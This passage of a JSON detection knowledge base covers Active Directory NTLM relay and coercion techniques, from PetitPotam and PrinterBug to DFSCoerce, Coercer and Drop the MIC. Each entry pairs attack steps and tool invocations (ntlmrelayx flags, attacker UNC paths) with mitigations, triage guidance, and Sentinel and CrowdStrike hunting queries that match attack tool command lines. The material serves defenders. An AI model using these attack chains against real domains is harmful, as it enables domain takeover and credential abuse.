where cnt > 3"},{"plat":"MDI","t":"One source IP producing NTLM success logons to many destination devices = malicious relay (src IP vs principal mismatch) / single host = benign","q":"IdentityLogonEvents\n| where Timestamp > ago(1d)\n| where Protocol == \"Ntlm\" and ActionType == \"LogonSuccess\"\n| summarize devices=dcount(DestinationDeviceName), accts=dcount(AccountName), dsts=make_set(DestinationDeviceName,15) by IPAddress\n| where devices > 5"}],"huntcs":[{"plat":"Event Search","t":"One source process fanning out SMB(445) to many hosts=ntlmrelayx relay=bad / admin tool limited reach=white.","q":"event_simpleName=NetworkConnectIP4 RemotePort=445\n| stats dc(RemoteAddressIP4) as targets, count as conns by ComputerName, ContextBaseFileName\n| where targets > 10\n| sort - targets"},{"plat":"Event Search","t":"Single source IP driving LogonType3 NTLM logons across many hosts=relay landing=bad (source-IP vs principal mismatch) / legit admin limited=white.","q":"event_simpleName=UserLogon LogonType=3\n| stats dc(ComputerName) as targets, count as logons, values(UserName) as accts by RemoteAddressIP4\n| where targets > 5\n| sort - targets"}]},{"name":"NTLM Relay to LDAP / LDAPS","aka":"ntlmrelayx LDAP, RBCD/Shadow Credentials/rights granting","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001, T1187","cve":"CVE-2017-8563","sev":"Critical","summary":"Relay machine/user authentication to a DC's LDAP, leading directly to domain privilege escalation such as RBCD configuration, Shadow Credentials grants, computer creation, and DCSync rights grants.","how":"Coerce a DC's machine-account authentication via forced authentication (PetitPotam, etc.) -> relay to ldap(s)://DC with ntlmrelayx. With --delegate-access, set RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) on an attacker-controlled computer and reach the DC via S4U2self. Alternatively, write msDS-KeyCredentialLink (Shadow Credentials) for PKINIT. For unsigned LDAP, combine with MIC removal such as drop-the-MIC. Prereq: LDAP signing/channel binding not enforced.","tools":"ntlmrelayx.py -t ldap://dc --delegate-access / --add-computer / --escalate-user, PetitPotam.py, gettgtpkinit/Rubeus","detect":"Addition of msDS-AllowedToActOnBehalfOfOtherIdentity or msDS-KeyCredentialLink (5136), new computer account creation (4741), ACL changes (5136 nTSecurityDescriptor). DC machine authentication originating from another host.","events":"4624(NTLM), 4741(コンピュータ作成), 5136(RBCD/KeyCredential/ACL), 4662(DCSync)","mitigate":"Require LDAP signing on the DC (LDAPServerIntegrity=2) + require LDAPS channel binding (EPA). ms-DS-MachineAccountQuota=0. Audit and privilege-protect RBCD/KeyCredential attributes. Apply the CVE-2017-8563 patch.","triage":"On the DC, check Security 5136 for additions of msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD), msDS-KeyCredentialLink (Shadow Credentials), or nTSecurityDescriptor (ACL/DCSync rights) originating from a computer/machine account; if this is immediately preceded by coerced DC$ NTLM auth from a different host (4624 NTLM) and chains with 4741 (new computer) or 4662 (replication rights toward DCSync) by the same actor in the same window, it is black. Environments without enforced LDAP signing/channel binding are the main target. Object-attribute updates by legitimate ADCS/Exchange/IdM products, approved delegation changes, or ops work where the changing account and host are consistent lean white.","hunt":[{"plat":"Sentinel","t":"5136 write of RBCD or KeyCredential attribute = relay/black; routine delegation admin change = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"msDS-AllowedToActOnBehalfOfOtherIdentity\" or Properties has \"msDS-KeyCredentialLink\"\n| where OperationType == \"%%14674\" // Value Added\n| summarize writes=count(), attrs=make_set(Properties, 5) by SubjectUserName, ObjectName, Computer, bin(TimeGenerated, 10m)\n| where SubjectUserName endswith \"$\" or writes > 1\n| order by writes desc"},{"plat":"Sentinel","t":"New computer (4741) followed by RBCD write on same object = relay/black; standalone domain join = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4741\n| project CreateTime=TimeGenerated, Creator=SubjectUserName, NewComputer=TargetUserName, Computer\n| join kind=inner (\n    SecurityEvent\n    | where TimeGenerated > ago(1d)\n    | where EventID == 5136 and Properties has \"msDS-AllowedToActOnBehalfOfOtherIdentity\"\n    | project RbcdTime=TimeGenerated, ObjectName, Setter=SubjectUserName\n) on $left.NewComputer == $right.ObjectName\n| where RbcdTime between (CreateTime .. CreateTime + 30m)\n| project CreateTime, Creator, NewComputer, Setter, RbcdTime, Computer"}],"huntcs":[{"plat":"Event Search","t":"ntlmrelayx LDAP relay tooling on the attacker host. -t ldap(s) from a workstation=black / legit LDAP admin tool=white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*ntlmrelayx*\" OR CommandLine=\"*-t ldap*\" OR CommandLine=\"*-t ldaps*\" OR CommandLine=\"*--delegate-access*\" OR CommandLine=\"*--add-computer*\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine\n| sort -count"},{"plat":"LogScale","t":"One non-DC host fanning LDAP 389/636 to many DCs. one process → many DCs=black / steady single DC=white","q":"#event_simpleName=NetworkConnectIP4\n| in(RemotePort, values=[389,636])\n| groupBy([aid, ComputerName, ContextBaseFileName], function=[count(RemoteAddressIP4, as=ldap_targets, distinct=true), count(as=conns)])\n| ldap_targets >= 2\n| sort(ldap_targets, order=desc)"}]},{"name":"PrivExchange (EWS Coercion → LDAP Relay)","aka":"PrivExchange, cross-protocol HTTP relay","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001","cve":"CVE-2019-0724, CVE-2018-8581","sev":"High","summary":"Coerce the Exchange server's own high-privilege machine authentication via Exchange EWS PushSubscription and relay it to LDAP to grant DCSync rights over the domain.","how":"Registering an attacker URL in Exchange's pushSubscription causes Exchange$ to send HTTP NTLM authentication at SYSTEM-equivalent privilege. Relay this to LDAP with ntlmrelayx and abuse Exchange's default excessive rights (WriteDacl on domain) to grant DCSync to any user. Prereqs: unpatched Exchange and default excessive ACLs.","tools":"privexchange.py, ntlmrelayx.py -t ldap://dc --escalate-user, httpattack","detect":"LDAP writes by the Exchange machine account, domain-object ACL changes, anomalous EWS push subscription registrations.","events":"5136(ACL/DCSync権限付与), 4662, Exchange EWSログ","mitigate":"Apply Exchange Cumulative Updates, reduce Exchange's excessive rights (official mitigation script), enforce LDAP signing/EPA. CVE-2018-8581/2019-0724 patches.","triage":"On the DC, check Security 5136/4662 for the Exchange machine account modifying domain-object ACLs (WriteDacl abuse) or granting DCSync rights (DS-Replication-Get-Changes/-All) to an arbitrary user, and if Exchange EWS logs show a pushSubscription registration pointing at an attacker URL just before, with Exchange$ emitting HTTP NTLM auth externally as SYSTEM-equivalent, the chain is black. Unpatched Exchange plus default over-privileged ACLs is the precondition. Legitimate Exchange delegation or health checks, ACL changes by approved admins, or valid EWS push subscriptions to internal-workload URLs lean white — subscriptions to external/unknown URLs warrant immediate investigation.","hunt":[{"plat":"Sentinel","t":"Exchange machine account writing domain ACL (5136 nTSecurityDescriptor) = PrivExchange/black; Exchange$ never edits ACLs normally = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where SubjectUserName endswith \"$\"\n| where SubjectUserName has \"EXCH\" or SubjectUserName has \"MAIL\" or SubjectUserName has \"MBX\"\n| where Properties has \"nTSecurityDescriptor\" or Properties has \"GenericAll\" or Properties has \"WriteDacl\"\n| summarize count() by SubjectUserName, ObjectName, ObjectType, Computer, bin(TimeGenerated, 10m)\n| order by count_ desc"},{"plat":"Sentinel","t":"4662 DS-Replication (DCSync) GUID by a machine account = grant/abuse black; legit DC-to-DC replication = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where Properties has \"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\" or Properties has \"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\"\n| where SubjectUserName endswith \"$\"\n| where SubjectUserName !has \"DC\" // exclude expected domain controllers; confirm your DC naming\n| summarize count() by SubjectUserName, ObjectName, Computer, bin(TimeGenerated, 10m)"}],"huntcs":[{"plat":"Event Search","t":"PrivExchange coercion tooling on the attacker host. privexchange/httpattack process=black / normal EWS use=white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*privexchange*\" OR CommandLine=\"*httpattack*\" OR CommandLine=\"*pushSubscription*\" OR CommandLine=\"*/ews/*\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine\n| sort -count"},{"plat":"Identity Protection","t":"Exchange$ granting domain ACL/DCSync rights is a DC-only LDAP write — covered by Falcon Identity Protection, not EDR","q":"// Falcon Identity Protection detection: NTLM relay to LDAP / anomalous privilege grant (Exchange$ writing domain nTSecurityDescriptor / DCSync ACE).\n// Falcon EDR does not record DC 5136 ACL changes; pivot to attacker-host process (query above) or ingest Windows Security log 4662/5136 into Next-Gen SIEM."}]},{"name":"PetitPotam (MS-EFSRPC Coercion)","aka":"EfsRpcOpenFileRaw etc., CVE-2021-36942","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187","cve":"CVE-2021-36942","sev":"Critical","summary":"Coercion abusing the EfsRpc* functions of MS-EFSRPC (Encrypting File System Remote Protocol) to force machine authentication to an attacker UNC path from any host, including DCs.","how":"Pass a UNC (\\\\attacker\\share) to EfsRpcOpenFileRaw/EfsRpcEncryptFileSrv over \\pipe\\lsarpc etc. to make the target DC$ send its NTLM authentication to the attacker. Some versions succeeded without authentication (anonymously). Chain with ADCS ESC8 or LDAP relay for domain takeover. Prereqs: a reachable EFSRPC pipe, and relay-target signing/EPA not enforced.","tools":"PetitPotam.py, Coercer, dementor.py, ntlmrelayx","detect":"External EfsRpc calls to the lsarpc/efsrpc pipes, DC$ authenticating to a relay-target host, an immediately following certificate request.","events":"5145(名前付きパイプアクセス lsarpc/efsrpc), 4624(DC$のNTLM), 4886/4768(ADCS連結時)","mitigate":"CVE-2021-36942 patch; disable the EFS service if unneeded. Restrict NTLM on DC/CA and force Kerberos, require EPA/signing on relay targets (LDAP/ADCS). Block EFSRPC with RPC filters.","triage":"On the target DC, check Security 5145 for external-host access to the `\\pipe\\lsarpc` or `\\pipe\\efsrpc` named pipe (EfsRpcOpenFileRaw/EfsRpcEncryptFileSrv calls, UNC in RelativeTargetName), and if DC$ NTLM auth (4624 NTLM) originating from the relay host follows immediately — with CA-side 4886/4887 (cert request) and 4768 (PKINIT TGT for DC$) chaining in the same window when linked to ADCS — it is black. In the auth-optional variant the caller being anonymous/low-privileged is also a tell. Legitimate EFS operations or file-encryption processing, or backup products using EFSRPC where the pipe access originates from a known server with no auth relay, lean white.","hunt":[{"plat":"Sentinel","t":"5145 bursts to lsarpc/efsrpc pipes from an external IP = PetitPotam coercion/black; internal EFS use = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145\n| where ShareName has \"IPC$\"\n| where RelativeTargetName in~ (\"lsarpc\", \"efsrpc\", \"lsass\", \"samr\", \"netlogon\")\n| summarize pipes=make_set(RelativeTargetName), hits=count() by IpAddress, Account, Computer, bin(TimeGenerated, 10m)\n| where hits > 5\n| order by hits desc"},{"plat":"MDE","t":"NamedPipeEvent on efsrpc/lsarpc from a remote initiator on a DC = coercion/black; local-service origin = white","q":"DeviceEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"NamedPipeEvent\"\n| where AdditionalFields has \"efsrpc\" or AdditionalFields has \"lsarpc\"\n| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, AdditionalFields\n| take 100"}],"huntcs":[{"plat":"Event Search","t":"PetitPotam/EfsRpc coercion tooling on the attacker host. PetitPotam/dementor process=black / legit EFS=white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*PetitPotam*\" OR CommandLine=\"*EfsRpcOpenFileRaw*\" OR CommandLine=\"*dementor*\" OR CommandLine=\"*efsrpc*\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine\n| sort -count"},{"plat":"LogScale","t":"Connects to lsarpc/efsrpc pipes on a DC. anomalous MS-EFSRPC pipe access=black / local svchost=white","q":"#event_simpleName=NamedPipeConnected\n| PipeName=/\\\\(lsarpc|efsrpc)$/i\n| groupBy([ComputerName, PipeName, ContextBaseFileName], function=count(as=hits))\n| sort(hits, order=desc)"}]},{"name":"PrinterBug / SpoolSample (MS-RPRN Coercion)","aka":"SpoolSample, RpcRemoteFindFirstPrinterChangeNotification","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187","cve":"","sev":"High","summary":"The original coercion: use MS-RPRN (Print Spooler RPC) RpcRemoteFindFirstPrinterChangeNotificationEx to make a target send authentication disguised as a printer change notification to the attacker.","how":"Run printerbug.py against a target with the Spooler service enabled (including DCs) to induce DC$ authentication to the attacker host. Relay the captured authentication to LDAP/ADCS/SMB, or send it to an unconstrained delegation host to seize a TGT (chained with Unconstrained Delegation attacks). Prereq: the Print Spooler service is running.","tools":"SpoolSample.exe, printerbug.py (dementor派生), Coercer, ntlmrelayx/rubeus monitor","detect":"External RpcRemoteFindFirstPrinterChangeNotification calls to the spoolss pipe, outbound DC$ authentication, unexpected RPC claiming to be the Spooler.","events":"5145(spoolssパイプ), 4624(マシンアカウントNTLM), Sysmon 3(異常な外向き接続)","mitigate":"Stop the Print Spooler service on DCs/critical servers (also common with PrintNightmare mitigation). Restrict MS-RPRN with RPC filters, restrict NTLM, enforce signing/EPA on relay targets.","triage":"On the target (including DCs), check Security 5145 for external-host access to the `spoolss` named pipe (RpcRemoteFindFirstPrinterChangeNotification-style calls), and if that DC$/machine account's outbound NTLM auth (4624 NTLM) originating from the relay or an unconstrained-delegation host follows immediately, with Sysmon EID3 showing anomalous outbound connections to that host, it is black. TGT capture on the delegation host (Unconstrained Delegation chaining) or subsequent cert requests/ACL changes (ADCS/LDAP chaining) raise confidence. Legitimate printer change notifications (normal spoolss RPC between print server and clients), access from a known print-management system, or steady traffic with no auth relay lean white.","hunt":[{"plat":"Sentinel","t":"5145 access to the spoolss pipe from a remote source = PrinterBug/black; legitimate print management = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145\n| where RelativeTargetName =~ \"spoolss\"\n| summarize hits=count(), targets=dcount(Computer) by IpAddress, SubjectUserName, bin(TimeGenerated, 5m)\n| where hits > 3\n| order by hits desc"},{"plat":"MDE","t":"spoolsv.exe making outbound 445/389/636 connections = coerced DC auth/black; spooler never dials SMB/LDAP out = white","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where InitiatingProcessFileName =~ \"spoolsv.exe\"\n| where ActionType == \"ConnectionSuccess\"\n| where RemotePort in (445, 389, 636)\n| project Timestamp, DeviceName, RemoteIP, RemotePort, InitiatingProcessFileName\n| summarize count() by DeviceName, RemoteIP, RemotePort"}],"huntcs":[{"plat":"Event Search","t":"SpoolSample/PrinterBug tooling on the attacker host. SpoolSample/dementor process=black / normal print use=white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*SpoolSample*\" OR CommandLine=\"*printerbug*\" OR CommandLine=\"*RpcRemoteFindFirst*\" OR CommandLine=\"*dementor*\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine\n| sort -count"},{"plat":"LogScale","t":"RPC to the spoolss pipe. unexpected spoolss pipe access=black / legit print server=white","q":"#event_simpleName=NamedPipeConnected\n| PipeName=/\\\\spoolss$/i\n| groupBy([ComputerName, PipeName, ContextBaseFileName], function=count(as=hits))\n| sort(hits, order=desc)"}]},{"name":"DFSCoerce (MS-DFSNM Coercion)","aka":"NetrDfsRemoveStdRoot/NetrDfsAddStdRoot","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187","cve":"","sev":"High","summary":"Coercion abusing MS-DFSNM (Distributed File System Namespace Management) RPC to force machine authentication from the DC. DFS often runs on DCs, making it hard to mitigate.","how":"Pass a UNC path to NetrDfsAddStdRoot/NetrDfsRemoveStdRoot on \\pipe\\netdfs to trigger DC$ authentication. Valuable as an alternative coercion that survives even where PetitPotam/PrinterBug are patched or disabled. Chain into ADCS/LDAP relay. Prereq: reachable DFS service (usually running on the DC).","tools":"dfscoerce.py, Coercer, ntlmrelayx","detect":"External NetrDfs* calls to the netdfs pipe; outbound authentication from DC$.","events":"5145(netdfsパイプ), 4624(DC$ NTLM)","mitigate":"Restrict MS-DFSNM to trusted sources via RPC filters, restrict NTLM on DCs, enforce EPA/signing on relay targets. Root fix is neutralizing the relay target (signing/EPA).","triage":"On the DC pull 5145 for `\\pipe\\netdfs` (Share Name=IPC$, Relative Target Name=netdfs) from an external source, then confirm NetrDfsAddStdRoot/NetrDfsRemoveStdRoot triggering DC$ making an outbound 4624 LogonType3 (NTLM) toward a third-party host it never authenticates to. Verdict black if the source is a user workstation/Kali/unmanaged IP, the UNC path points at an attacker host, and it chains into ADCS (4886/4887) or LDAP write (5136). Benign if the source is a legitimate DFS management/backup server doing scheduled namespace changes with no relay artifacts.","hunt":[{"plat":"Sentinel","t":"5145 access to the netdfs pipe from a remote source = DFSCoerce/black; DFS admin confined to DFS servers = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145\n| where RelativeTargetName =~ \"netdfs\"\n| summarize hits=count() by IpAddress, SubjectUserName, Computer, bin(TimeGenerated, 5m)\n| where hits > 0\n| order by hits desc"}],"huntcs":[{"plat":"Event Search","t":"DFSCoerce/NetrDfs tooling on the attacker host. DFSCoerce process=black / legit DFS admin=white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*DFSCoerce*\" OR CommandLine=\"*NetrDfsRemoveStdRoot*\" OR CommandLine=\"*NetrDfsAddStdRoot*\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine\n| sort -count"},{"plat":"LogScale","t":"MS-DFSNM connects to the netdfs pipe. unexpected netdfs pipe access=black / local admin=white","q":"#event_simpleName=NamedPipeConnected\n| PipeName=/\\\\netdfs$/i\n| groupBy([ComputerName, PipeName, ContextBaseFileName], function=count(as=hits))\n| sort(hits, order=desc)"}]},{"name":"ShadowCoerce (MS-FSRVP Coercion)","aka":"IsPathSupported/IsPathShadowCopied","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187","cve":"","sev":"Medium","summary":"Coercion abusing MS-FSRVP (File Share Shadow Copy) RPC. Works on hosts where the File Server VSS Agent is enabled.","how":"Pass a UNC to IsPathSupported/IsPathShadowCopied on \\pipe\\FssagentRpc to trigger target authentication. Partially fixed in KB5015527, but re-exploitation has been reported. Used as a variant when other coercions are closed. Prereq: 'File Server VSS Agent Service' enabled.","tools":"shadowcoerce.py, Coercer, ntlmrelayx","detect":"External calls to the FssagentRpc pipe; outbound authentication from unexpected machines.","events":"5145(FssagentRpcパイプ), 4624","mitigate":"Disable 'File Server VSS Agent Service' if not needed, apply relevant patches, use RPC filters. Enforce signing/EPA on relay targets.","triage":"On the target member server/DC pull 5145 for `\\pipe\\FssagentRpc` from an external source, then correlate IsPathSupported/IsPathShadowCopied with the target machine account making an unexpected 4624 (NTLM) to a foreign host. With 'File Server VSS Agent Service' enabled, verdict black if the source is unmanaged, the UNC points at an attacker host, and ADCS/LDAP relay artifacts follow. Benign if the source is a legitimate VSS/backup product (Veeam, Windows Backup) running scheduled snapshots and the outbound auth target is the same backup infrastructure.","hunt":[{"plat":"Sentinel","t":"5145 access to the FssagentRpc pipe from a remote source = ShadowCoerce/black; internal VSS/backup use = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145\n| where RelativeTargetName =~ \"FssagentRpc\"\n| summarize hits=count() by IpAddress, SubjectUserName, Computer, bin(TimeGenerated, 5m)\n| order by hits desc"}],"huntcs":[{"plat":"Event Search","t":"ShadowCoerce/FSRVP tooling on the attacker host. ShadowCoerce process=black / legit VSS use=white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*ShadowCoerce*\" OR CommandLine=\"*IsPathShadowCopied*\" OR CommandLine=\"*IsPathSupported*\" OR CommandLine=\"*FssagentRpc*\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine\n| sort -count"},{"plat":"LogScale","t":"Connects to the FssagentRpc pipe. unexpected MS-FSRVP pipe access=black / local backup agent=white","q":"#event_simpleName=NamedPipeConnected\n| PipeName=/FssagentRpc/i\n| groupBy([ComputerName, PipeName, ContextBaseFileName], function=count(as=hits))\n| sort(hits, order=desc)"}]},{"name":"Coercer (multi-vector coercion framework)","aka":"Coercer.py (covers EFSR/DFSNM/RPRN/FSRVP/EVEN/PAR, etc.)","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187","cve":"","sev":"High","summary":"Unified tool that automatically discovers and executes all known coercion protocols (MS-EFSR/RPRN/DFSNM/FSRVP/MS-EVEN/PAR and dozens of methods).","how":"Use Coercer scan mode to auto-enumerate coercion methods the target responds to, then coerce mode to force authentication en masse. Because it tries alternative pipes/functions comprehensively even when individual tools are blocked, a single patch cannot fully prevent it. Run alongside ntlmrelayx to relay to ADCS/LDAP.","tools":"Coercer scan/coerce -t <target> -l <attacker>, ntlmrelayx","detect":"Rapid successive access to multiple RPC pipes (lsarpc/efsrpc/netdfs/spoolss/FssagentRpc, etc.) in a short window; frequent outbound authentication from a target is a sign of automated scanning.","events":"5145(複数パイプ連続アクセス), 4624/4625多発","mitigate":"Root fix is neutralizing relay targets (SMB signing / LDAP signing + EPA / ADCS EPA) and a policy of eliminating NTLM entirely. Use RPC filters to restrict all coercion protocols at once; stop unneeded services.","triage":"Sequence the target's 5145 events and look for one source hitting many pipes (`lsarpc`/`efsrpc`/`netdfs`/`spoolss`/`FssagentRpc`) in a short window plus a burst of 4624/4625. Verdict black if a single host brute-forces dozens of RPC methods and it chains into outbound NTLM to an attacker host and ADCS/LDAP relay. Benign if a vuln scanner (Nessus/Qualys) or monitoring server runs scheduled scans from a known asset IP, the auth target is the scanner itself, and no relay artifacts exist.","hunt":[{"plat":"Sentinel","t":"One source hitting 3+ distinct coercion pipes in minutes = Coercer auto-scan/black; single-pipe legit use = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145\n| where RelativeTargetName in~ (\"lsarpc\", \"efsrpc\", \"netdfs\", \"spoolss\", \"FssagentRpc\", \"eventlog\", \"samr\", \"lsass\")\n| summarize distinctPipes=dcount(RelativeTargetName), pipeSet=make_set(RelativeTargetName), hits=count()\n    by IpAddress, SubjectUserName, Computer, bin(TimeGenerated, 5m)\n| where distinctPipes >= 3\n| order by distinctPipes desc, hits desc"}],"huntcs":[{"plat":"LogScale","t":"One context hitting many coercion RPC pipes fast = Coercer auto-scan (black) / single legit pipe=white","q":"#event_simpleName=NamedPipeConnected\n| PipeName=/(lsarpc|efsrpc|netdfs|spoolss|FssagentRpc|eventlog|winreg)$/i\n| groupBy([ComputerName, ContextProcessId, ContextBaseFileName], function=[count(PipeName, as=distinct_pipes, distinct=true), count(as=hits)])\n| distinct_pipes >= 3\n| sort(distinct_pipes, order=desc)"},{"plat":"Event Search","t":"Coercer.py execution on the attacker host. Coercer/python multi-vector=black / one-off admin=white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*Coercer*\" OR CommandLine=\"*coerce*\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine\n| sort -count"}]},{"name":"Drop the MIC (CVE-2019-1040)","aka":"MIC removal NTLM relay bypass","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001","cve":"CVE-2019-1040","sev":"Critical","summary":"Exploits a flaw where the DC accepts NTLM auth even after the MIC (Message Integrity Check) is stripped, bypassing signing requirements to enable cross-protocol relay such as SMB→LDAP.","how":"During relay, tamper with the MIC field and negotiate flags of NTLM_AUTHENTICATE so sessions that would require signing can still be relayed. Greatly raises the success rate of PetitPotam + LDAP relay. Implemented via ntlmrelayx --remove-mic. Prereq: DC/client unpatched for CVE-2019-1040.","tools":"ntlmrelayx.py --remove-mic, PetitPotam","detect":"NTLM auth missing the MIC; traces of cross-protocol relay (SMB-origin LDAP writes).","events":"4624(NTLM), 5136(RBCD/ACL変更)","mitigate":"Apply the June 2019+ cumulative update (CVE-2019-1040). Also enforce LDAP signing/channel binding and SMB signing.","triage":"In the suspected relay window pull 4624 (NTLM) on the DC/target and trace SMB-originated auth landing cross-protocol into an LDAP write (5136: RBCD/ACL change such as msDS-AllowedToActOnBehalfOfOtherIdentity). On an unpatched (CVE-2019-1040) DC, verdict black if a MIC-less NTLM_AUTHENTICATE coincides with an RBCD attribute write followed by S4U/DCSync. Benign if legitimate domain-join or computer-attribute admin changes come from a known admin host/delegated admin with no anomalous SMB-to-LDAP chain.","hunt":[{"plat":"Sentinel","t":"Machine NTLM logon (4624) then same actor RBCD write via LDAP (5136) = Drop-the-MIC cross-protocol relay/black; lone delegation change = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"msDS-AllowedToActOnBehalfOfOtherIdentity\" or Properties has \"msDS-KeyCredentialLink\"\n| where OperationType == \"%%14674\"\n| project LdapTime=TimeGenerated, Setter=SubjectUserName, ObjectName, Computer\n| join kind=inner (\n    SecurityEvent | where TimeGenerated > ago(1d) | where EventID == 4624 and LogonType == 3 and TargetUserName endswith \"$\"\n    | project NtlmTime=TimeGenerated, TargetUserName, IpAddress\n) on $left.Setter == $right.TargetUserName\n| where LdapTime between (NtlmTime .. NtlmTime + 15m)\n| project NtlmTime, IpAddress, Setter, LdapTime, ObjectName, Computer"}],"huntcs":[{"plat":"Identity Protection","t":"MIC-less NTLM (CVE-2019-1040) is a DC-only auth field EDR cannot see — use Falcon Identity Protection","q":"// Falcon Identity Protection detection: NTLM relay / MIC removal (CVE-2019-1040).\n// Falcon EDR cannot read the NTLM MIC/AV_PAIR; pivot to the attacker-host relay process (query below) or ingest Security log 4624 NTLM into Next-Gen SIEM."},{"plat":"Event Search","t":"ntlmrelayx launched with --remove-mic on the attacker host. remove-mic relay=black / no benign match=white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*remove-mic*\" OR (CommandLine=\"*ntlmrelayx*\" AND CommandLine=\"*--remove-mic*\"))\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine\n| sort -count"}]},{"name":"Drop the MIC 2 (CVE-2019-1166)","aka":"EPA/session bypass follow-up","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001","cve":"CVE-2019-1166","sev":"High","summary":"Follow-up vulnerability that bypasses MIC validation via MsvAvFlags manipulation, evading the CVE-2019-1040 fix. Slips past signing/EPA protections to complete a relay.","how":"Tamper with the NTLM AV_PAIR (MsvAvFlags) to drop the MIC-required bit, continuing signing-bypass relay under certain conditions even after patching. Used in ntlmrelayx-derived implementations. Prereq: relevant patch not applied.","tools":"ntlmrelayx (改造版), impacket","detect":"NTLM auth with tampered AV_PAIR; unexpected cross-protocol relay.","events":"4624(NTLM)","mitigate":"Apply CVE-2019-1166/CVE-2019-1338 patches; enforce LDAP/SMB signing + EPA to neutralize the relay itself.","triage":"For CVE-2019-1166 signing-bypass relay, correlate 4624 (NTLM) on the DC/target where the AV_PAIR (MsvAvFlags) MIC-required bit was cleared with unexpected cross-protocol relay (SMB-origin to LDAP/ADCS write). Verdict black if, despite patching, an NTLM session with disabled MIC protection chains same-account/same-time into RBCD or a cert request. Benign if a legitimate service-account NTLM auth has no relay target and fits normal in-app access; confirm NTLMSSP flag tampering from packet capture if available.","hunt":[{"plat":"Sentinel","t":"One machine account NTLM-validated (4776) from many distinct workstations in a short window = relay/tampered AV_PAIR/black; single fixed host = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4776\n| where TargetUserName endswith \"$\"\n| summarize sources=dcount(WorkstationName), hosts=make_set(WorkstationName, 10), attempts=count()\n    by TargetUserName, Computer, bin(TimeGenerated, 1h)\n| where sources > 1\n| order by sources desc"},{"plat":"Sentinel","t":"Machine account NTLM network logon (4624 Type3) from multiple source IPs = cross-protocol relay/black; single-IP normal auth = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4624 and LogonType == 3\n| where TargetUserName endswith \"$\"\n| summarize srcIPs=dcount(IpAddress), ips=make_set(IpAddress, 10), count() by TargetUserName, Computer, bin(TimeGenerated, 1h)\n| where srcIPs > 1"}],"huntcs":[{"plat":"Identity Protection","t":"Tampered-AV_PAIR NTLM (CVE-2019-1166) is a DC-only field EDR cannot see — use Falcon Identity Protection","q":"// Falcon Identity Protection detection: NTLM relay / EPA-session bypass (CVE-2019-1166, Drop-the-MIC 2).\n// Falcon EDR cannot inspect NTLM AV_PAIR flags; pivot to attacker-host relay process (query below) or ingest 4624 NTLM into Next-Gen SIEM."},{"plat":"Event Search","t":"Cross-protocol relay tooling (ntlmrelayx/-smb2support) on the attacker host. SMB→LDAP relay=black / none benign=white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*ntlmrelayx*\" AND (CommandLine=\"*-smb2support*\" OR CommandLine=\"*-t ldap*\"))\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine\n| sort -count"}]},{"name":"WebClient / WebDAV Coercion","aka":"HTTP auth coercion, PushSubscription/searchConnector, WebDAV activation","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187, T1557.001","cve":"","sev":"High","summary":"Starts the target's WebClient (WebDAV) service to force HTTP (NTLM) authentication. Since HTTP is unaffected by SMB signing, it creates an ideal path for cross-protocol relay such as ADCS ESC8.","how":"Use searchConnector-ms, .url/.lnk, or Coercer/PetitPotam with a UNC in WebDAV form (\\\\attacker@80\\path) to trigger WebClient startup. Without EPA, HTTP auth can be relayed to ADCS/HTTP free of signing constraints. On hosts where WebClient isn't running, trigger startup via change notify, etc. Prereq: WebClient service (present by default on Workstation).","tools":"Coercer (-web), PetitPotam (WebDAV), ntlmrelayx --adcs, WebClient起動用の.searchConnector","detect":"Unexpected startup of the WebClient service; outbound NTLM over WebDAV (HTTP) followed immediately by an ADCS certificate request.","events":"4624(HTTP NTLM), 